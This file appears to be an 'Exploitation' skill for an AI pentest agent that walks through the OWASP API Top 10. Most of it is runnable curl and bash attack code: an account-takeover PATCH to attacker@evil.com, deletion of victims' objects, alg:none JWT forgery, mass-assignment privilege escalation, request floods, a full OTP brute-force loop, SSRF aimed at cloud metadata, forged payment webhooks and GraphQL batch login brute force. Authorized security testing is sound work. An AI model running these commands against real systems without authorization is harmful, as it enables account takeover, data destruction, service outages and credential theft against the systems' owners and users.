# /api-security — OWASP API Top 10 (2023) Full Assessment

> **Skill type:** Exploitation  
> **Source:** 0x0pointer/skills `/api-security`, 0xsteph/pentest-ai-agents `api-security`, OWASP API Top 10 2023  
> **Chains into:** `/business-logic`, `/post-exploit`, `/credential-audit`  
> **Chained from:** `/recon`, `/web-exploit`

---

## Purpose

Comprehensive API security assessment covering OWASP API Top 10 (2023) across REST, GraphQL, gRPC, SOAP, and MCP APIs. Two-account testing loop for BOLA/BFLA.

---

## Phase 1: API Surface Discovery

```bash
# Spec hunting (automated)
for endpoint in /swagger.json /swagger.yaml /openapi.json /openapi.yaml /api-docs \
  /api/swagger.json /v1/swagger.json /api/v1/openapi.yaml /redoc /api/schema \
  /api/documentation /graphql /graphiql /__graphql; do
  status=$(curl -s -o /dev/null -w "%{http_code}" https://target.com$endpoint)
  [ "$status" == "200" ] && echo "FOUND: $endpoint"
done

# kiterunner — API brute force
kr scan https://target.com/api -w routes-large.kite --fail-status-codes 400,401,403,404

# JS bundle extraction
curl -s https://target.com | grep -oE "src=\"[^\"]+\.js\"" | while read f; do
  url=$(echo $f | cut -d'"' -f2)
  curl -s "https://target.com$url" | grep -oE '"(/api/[^"]+)"' | sort -u
done
```

---

## OWASP API Top 10 (2023) Attack Matrix

### API1: Broken Object Level Authorization (BOLA)

The most critical and common API vulnerability.

```bash
# Setup: Two accounts
# Account A (attacker): user_id=100, token=$TOKEN_A
# Account B (victim):   user_id=101, token=$TOKEN_B

# Test all ID-bearing endpoints with Account A's token
# accessing Account B's objects

# GET — read another user's data
curl -H "Authorization: Bearer $TOKEN_A" https://target.com/api/users/101
curl -H "Authorization: Bearer $TOKEN_A" https://target.com/api/orders/victim-order-id
curl -H "Authorization: Bearer $TOKEN_A" https://target.com/api/documents/victim-doc-id

# PUT/PATCH — modify another user's data
curl -X PATCH -H "Authorization: Bearer $TOKEN_A" \
  -d '{"email":"attacker@evil.com"}' https://target.com/api/users/101

# DELETE — delete another user's objects
curl -X DELETE -H "Authorization: Bearer $TOKEN_A" https://target.com/api/posts/victim-post-id

# What to look for in responses:
# - 200 OK with data → BOLA CONFIRMED
# - 403 Forbidden → properly protected
# - 404 Not Found → might be filtering, test with valid IDs
```

### API2: Broken Authentication

```bash
# Test JWT vulnerabilities
# 1. Algorithm confusion (alg:none)
# 2. Weak secret brute force
# 3. JWK injection
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9." \
  https://target.com/api/admin

# API key in URL (insecure)
curl "https://target.com/api/data?api_key=YOUR_KEY"  # Should be in header

# No token expiry
# Decode JWT, check "exp" field: jq -R 'split(".") | .[1] | @base64d | fromjson' <<< "$JWT"
# If exp is far future or missing → flag
```

### API3: Broken Object Property Level Authorization (BOPLA / Mass Assignment)

```bash
# Include extra fields in PUT/PATCH requests
# Test: Can a user update their own role/privilege fields?

# User profile update — normal
PATCH /api/users/100 {"name": "John Doe"}

# Mass assignment attack — add privilege fields
PATCH /api/users/100 {
  "name": "John Doe",
  "role": "admin",
  "is_admin": true,
  "admin": 1,
  "privilege_level": 99,
  "permissions": ["read", "write", "admin"],
  "subscription": "enterprise"
}

# Check response: are any of these fields reflected?
GET /api/users/100  # Does role now show "admin"?
```

### API4: Unrestricted Resource Consumption

```bash
# No rate limiting on expensive endpoints
for i in {1..1000}; do
  curl -s -X POST https://target.com/api/search \
    -d '{"query": "expensive_pattern_*"}' &
done  # All in parallel

# Image/file processing DoS
# Upload a 100MB TIFF file designed to expand to GB when processed
# (decompression bomb)

# GraphQL — depth/complexity abuse
query {
  user {
    friends {
      friends {
        friends {
          friends {  # Deep nesting
            id email name
          }
        }
      }
    }
  }
}

# GraphQL — alias abuse for rate limit bypass
query {
  u1: user(id: 1) { id email }
  u2: user(id: 2) { id email }
  # ... repeat 1000 times in one request
}
```

### API5: Broken Function Level Authorization (BFLA)

```bash
# Test admin/privileged functions with regular user token
# Pattern: find admin endpoints, test with regular user credentials

# Common admin endpoints
for endpoint in /admin /api/admin /api/v1/admin /management /api/management \
  /console /api/internal /superuser /api/system; do
  status=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $USER_TOKEN" \
    https://target.com$endpoint)
  echo "$status $endpoint"
done

# HTTP method abuse on objects
GET /api/users/101         # Might be allowed (public profile)
DELETE /api/users/101      # Should require admin — does it?
PUT /api/users/101/ban     # Admin function — accessible to regular user?
```

### API6: Unrestricted Access to Sensitive Business Flows

```bash
# Automated account creation (bot detection bypass)
# Buy flow automation (scalper attack)
# OTP brute force (no lockout)
for otp in {000000..999999}; do
  result=$(curl -s -X POST https://target.com/api/verify-otp -d "{\"otp\":\"$otp\",\"token\":\"$SESSION\"}")
  echo $result | grep -q "verified" && echo "OTP: $otp" && break
  sleep 0  # No rate limiting = vulnerability
done
```

### API7: Server-Side Request Forgery (SSRF) in APIs

```bash
# Find URL parameters in API requests
# webhook callbacks, profile images, document imports, URL preview

# Test SSRF
curl -X POST https://target.com/api/import \
  -d '{"url": "http://169.254.169.254/latest/meta-data/"}'

# Blind SSRF — DNS callback
curl -X POST https://target.com/api/preview \
  -d '{"url": "http://YOUR.burpcollaborator.net/api-ssrf"}'
```

### API8: Security Misconfiguration

```bash
# Check CORS policy
curl -H "Origin: https://evil.com" https://target.com/api/user/data -I
# Look for: Access-Control-Allow-Origin: https://evil.com  → CORS misconfiguration
# Worst case: Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true

# Check security headers
curl -I https://target.com/api/data | grep -E "X-Frame|X-Content|Strict-Transport|Content-Security"

# Check for exposed debug endpoints
curl https://target.com/api/debug
curl https://target.com/api/health?verbose=true
curl https://target.com/actuator/env  # Spring Boot
curl https://target.com/api/metrics
```

### API9: Improper Inventory Management

```bash
# Version drift — test old API versions
curl https://target.com/api/v1/users  # v1 might lack auth
curl https://target.com/api/v0/users
curl https://target.com/v1/api/users

# Beta/internal endpoints
curl https://target.com/api/beta/admin
curl https://target.com/api/internal/users
curl https://target.com/api/dev/debug
```

### API10: Unsafe Consumption of APIs

```bash
# If the target integrates third-party APIs, test:
# - Can you inject via data that gets passed to the third-party API?
# - Does the target trust third-party API responses without validation?

# Example: Webhook manipulation
# If target accepts webhooks from "Stripe", can you spoof a payment confirmed webhook?
curl -X POST https://target.com/webhooks/stripe \
  -H "Content-Type: application/json" \
  -d '{"type": "payment_intent.succeeded", "data": {"object": {"id": "pi_fake", "amount": 0}}}'
```

---

## GraphQL Specific Testing

```bash
# Introspection (discover schema)
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'

# If introspection disabled, try:
# InQL Burp extension — batch introspection bypass
# Clairvoyance — field discovery without introspection

# Batch query attack (N+1 / rate limit bypass)
# Malicious batch query
curl -X POST https://target.com/graphql \
  -d '[{"query":"mutation{login(u:\"a\",p:\"aaa\")}"},
       {"query":"mutation{login(u:\"a\",p:\"bbb\")}"},
       ...]'  # 1000 mutations in one request

# Introspection-based IDOR
# Get list of all user IDs via __type then access each
```
